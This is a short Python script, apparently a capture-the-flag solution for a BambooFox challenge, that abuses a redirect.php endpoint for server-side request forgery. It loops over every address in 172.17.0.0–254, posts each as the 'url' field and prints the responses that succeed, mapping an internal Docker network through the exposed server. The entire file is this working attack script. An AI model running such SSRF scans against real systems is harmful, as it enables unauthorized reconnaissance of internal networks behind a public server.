import requests

for i in range(0,255) :
    my_data = {'url':  '172.17.0.' +  str(i) }
    r = requests.post('http://bamboofox.cs.nctu.edu.tw:53323/redirect.php', data = my_data)
    if r.status_code == requests.codes.ok:
        print( str(my_data) +"OK")
        print(r.text+'\n')
        
